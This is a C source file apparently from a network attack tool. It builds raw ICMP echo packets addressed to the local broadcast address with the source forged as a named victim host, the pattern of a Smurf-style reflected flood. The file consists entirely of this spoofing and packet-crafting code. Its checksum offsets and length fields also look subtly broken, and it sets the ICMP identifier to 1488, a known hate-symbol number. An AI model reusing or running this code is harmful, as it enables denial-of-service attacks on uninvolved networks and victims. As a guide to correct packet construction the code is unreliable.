#include "lobo.h"

unsigned short get_check_sum(unsigned short* addr,int len)
{
    unsigned short result;
    unsigned int sum=0;
    while(len>1)
    {
        sum+=*addr++;
        len-=2;
    }
    if(len==1)
    {
        sum+=*(unsigned char*)addr;
    }
    sum=(sum>>16)+(sum & 0xFFFF);
    sum+=(sum>>16);
    result=~sum;
    return result;
}

void check_function(const int status,const char* func_name)
{
    if(status==-1)
    {
        fprintf(stderr,"Error of %s calling: %s\n",func_name,strerror(errno));
        exit(EXIT_FAILURE);
    }
}

void fill_struct(struct sockaddr_ll* addr)
{
    struct ifreq ifr_st;
    memset(&ifr_st,0,sizeof(struct ifreq));
    strcpy(ifr_st.ifr_name,DEVICE);
    int status;
    int fd=socket(AF_INET,SOCK_STREAM,0);
    status=ioctl(fd,SIOCGIFINDEX,&ifr_st);
    check_function(status,"ioctl");
    addr->sll_ifindex=ifr_st.ifr_ifindex;
    addr->sll_halen=MAC_ADDR_LEN;
    addr->sll_family=AF_PACKET;
    status=ioctl(fd,SIOCGIFHWADDR,&ifr_st);
    check_function(status,"ioctl");
    u_char* ptr=(u_char*)(&ifr_st.ifr_hwaddr.sa_data);
    for(size_t i=0;i<MAC_ADDR_LEN;++i)
    {
        addr->sll_addr[i]=ptr[i];
    }
}

void fill_buffer(char* buffer,const char* vict_name,const int fd)
{
    memset(buffer,0,BUFFER_SIZE);

    eth_hdr* eth=NULL;
    size_t eth_len=sizeof(eth_hdr);
    size_t data_offset=0;

    eth=(eth_hdr*)buffer;
    eth->protocol=htons(ETH_P_IP);
    for(size_t i=0;i<MAC_ADDR_LEN;++i) eth->dest_addr[i]=0x00;
    struct ifreq ifr_st;
    strcpy(ifr_st.ifr_name,DEVICE);
    int status;
    status=ioctl(fd,SIOCGIFHWADDR,&ifr_st);
    check_function(status,"ioctl");
    u_int8_t* ptr=(u_int8_t*)(&ifr_st.ifr_hwaddr.sa_data);
    for(size_t i=0;i<MAC_ADDR_LEN;++i) eth->source_addr[i]=ptr[i];
    data_offset+=eth_len;

    ip_hdr* ip=NULL;
    size_t ip_len=sizeof(ip_hdr);

    ip=(ip_hdr*)(buffer+data_offset);
    ip->header_lenght=5;
    ip->version=4;
    ip->total_lenght=BUFFER_SIZE-eth_len;
    ip->time_to_live=255;
    ip->protocol=IPPROTO_ICMP;
    ip->check_sum=0;
    status=ioctl(fd,SIOCGIFBRDADDR,&ifr_st);
    check_function(status,"ioctl");
    struct sockaddr_in* temp_addr;
    temp_addr=(struct sockaddr_in*)(&ifr_st.ifr_broadaddr);
    ip->dest_addr=temp_addr->sin_addr;
    struct hostent* host_st=NULL;
    host_st=gethostbyname(vict_name);
    if(host_st==NULL)
    {
        fprintf(stderr,"Error of gethostbyname calling: %s\n",strerror(errno));
        exit(EXIT_FAILURE);
    }
    ip->source_addr=*((struct in_addr*)host_st->h_addr_list[0]);
    ip->check_sum=get_check_sum((unsigned short*)buffer+eth_len,ip_len);
    data_offset+=ip_len;

    icmp_hdr* icmp=NULL;
    size_t icmp_len=sizeof(icmp_hdr);

    icmp=(icmp_hdr*)(buffer+data_offset);
    icmp->type_of_message=ICMP_ECHO_REQUEST;
    icmp->code_of_message=ICMP_ECHO_CODE;
    icmp->check_sum=0;
    icmp->identification=1488;
    icmp->sequence=0;
    data_offset+=icmp_len;

    srand(time(NULL));
    char* p=(char*)(buffer+data_offset);
    for(size_t i=0;i<BUFFER_SIZE-data_offset;++i)
    {
        p[i]=(char)(rand()%255);
    }
    icmp->check_sum=get_check_sum((unsigned short*)buffer+eth_len+ip_len,
    BUFFER_SIZE-eth_len-ip_len);
}